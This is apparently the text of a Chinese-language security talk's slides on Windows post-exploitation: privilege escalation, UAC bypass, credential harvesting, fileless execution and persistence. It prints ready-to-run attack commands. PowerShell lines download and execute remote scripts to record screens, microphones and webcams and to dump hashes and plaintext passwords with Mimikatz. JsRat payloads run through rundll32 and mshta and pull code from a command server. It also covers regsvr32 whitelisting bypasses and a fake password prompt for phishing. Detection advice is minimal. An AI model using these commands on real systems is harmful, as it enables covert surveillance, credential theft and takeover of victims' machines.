提权
我来作主人
Escalate Privileges
常见的提权方式
• 本地提权漏洞
• 服务提权
• 协议
• Phishing
本地提权
根据补丁号来确定是否存在漏洞的脚本：
https://github.com/GDSSecurity/Windows-Exploit-Suggester
将受害者计算机systeminfo导出到文件:
Systeminfo > 1.txt
使用脚本判断存在的漏洞：
python$windows-exploit-suggester.py--database$2016-05-31-mssb.xls$--
systeminfo ~/Desktop/1.txt
可能遇到的问题
Exp被杀！
将Exp改成Powershell：
http://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html
Demo Time
服务提权
常用服务：
Mssql，Mysql，Oracle，Ftp
第三方服务：
Dll劫持，文件劫持
提权脚本Powerup：
http://drops.wooyun.org/tips/11989
协议提权
利用已知的Windows中的问题，以获得本地权限提升 -> Potato
其利用NTLM中继（特别是基于HTTP > SMB中继）和NBNS欺骗进行提权。
详情：
http://tools.pwn.ren/2016/01/17/potato-windows.html
Phishing
MSF Ask模块：
exploit/windows/local/ask
通过runas方式来诱导用户通过点击uac验证来获取最高权限。
需要修改的msf脚本
metasploit/lib/msf/core/post/windows/runas.rb
Phishing Demo
屋里有什么
Gather Information
Gather Information
成为了主人，或许我们需要看看屋里里面有什么？
两种情况：
1：已经提权有了最高权限，为所欲为
2：未提权，用户还有UAC保护，还不能做所有的事情
Bypass UAC
常用方法：
ü 使用IFileOperation COM接口
ü 使用Wusa.exe的extract选项
ü 远程注入SHELLCODE 到傀儡进程
ü DLL劫持，劫持系统的DLL文件
ü 直接提权过UAC
ü Phishing
http://evi1cg.me/archives/Powershell_Bypass_UAC.html
ü http://www.powershellempire.com/?page_id=380
有了权限，要做什么
搜集mstsc记录，浏览器历史记录，最近操作的文件，本机密码等
键盘记录
屏幕录像
Netripper
GetPass Tips
通过脚本弹出认证窗口，让用户输入账号密码，由此得到用户的明文密
码。
powershell脚本如下：
From:https://github.com/Ridter/Pentest/blob/master/note/Powershell_MSFCapture.md
GetPass Tips
MSF模块
post/windows/gather/phish_windows_credentials
更多参考
Installed Programs
﹒Startup Items
Installed Services
﹒Security Services 
﹒File/Printer Shares ﹒DatabaseServers
﹒Certificate Authority
Sensitive Data
﹒Key-logging
﹒Screen capture
﹒Network traffic capture
User Information
System Configuration
﹒Password Policy
﹒Security Policies
﹒Configured Wireless Networks and Keys
新的攻击方法
无文件
无文件姿势之(一)-Powershell
屏幕监控：
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://evi1cg.me/powershell/Show-TargetScreen.ps1’); Show-TargetScreen”
录音：
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1’);Get-
MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias ‘SECRET’”
摄像头监控：
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1’); Capture-MiniEye -RecordTime 2 -
Path $env:temp\hack.avi”-Path $env:temp\hack.avi”
抓Hash:
powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1’);Get-PassHashes
抓明文：
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
无文件姿势之(一)-Powershell
Empire:
Metasploit:
无文件姿势之(二)- js
JsRat：
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.
5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.S
end();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WSc
ript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
From:$$$$$$$$$$$$$
《JavaScript$Backdoor$》 http://drops.wooyun.org/tips/11764
《JavaScript$Phishing》
http://drops.wooyun.org/tips/12386
无文件姿势之(三)- mshta
启动JsRat：
Mshta javascript:"\..\mshtml,RunHTMLApplication
";document.write();h=new%20ActiveXObject("WinHttp
.WinHttpRequest.5.1");h.Open("GET","http://192.16
8.2.101:9998/connect",false);try{h.Send();b=h.Res
ponseText;eval(b);}catch(e){new%20ActiveXObject("
WScript.Shell").Run("cmd /c taskkill /f /im
mshta.exe",0,true);}
无文件姿势之(四)- sct
SCT：
regsvr32 /u /s 
/i:http://urlto/calc.sct
scrobj.dll
Calc.sct
From:$$
《 Use$SCT$to$Bypass$Application$Whitelisting$Protection$》http://drops.wooyun.org/tips/15124
无文件姿势之(五) - wsc
Wsc：
rundll32.exe 
javascript:"\..\mshtml,RunHTMLApplic
ation
";document.write();GetObject("script
:http://urlto/calc.wsc")
Calc.wsc
From:$$$$$$$$$$$$$
《 WSC、JSRAT$and$WMI$Backdoor$》http://drops.wooyun.org/tips/15575
Demo Time
挖一个密道
Persistence
常见方法
ü启动项
ü注册表
üwmi
üat 
üschtasks
ü利用已有的第三方服务
新方法
Bitsadmin：
• 需要获得管理员权限
• 可开机自启动、间隔启动
• 适用于Win7 、Win8、Server 2008及以上操作系统
• 可绕过Autoruns对启动项的检测
• 已提交至MSRC(Microsoft Security Response Center)
Demo Time
我来抓住你
Detection and Mitigations
Detection and Mitigations
•
bitsadmin /list /allusers /verbose
•
Stop Background Intelligent Transfer Service
Detection and Mitigations
关注drops
Special thanks to
Casey Smith @subTee
Reference
1、Shell is Only the Beginning quote from Carlos Perez’s Blog 
http://www.darkoperator.com/
2、 Matt Graeber’s idea quote from
https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-
Persistent%20Asynchronous-And-Fileless-Backdoor.pdf
Q & A
3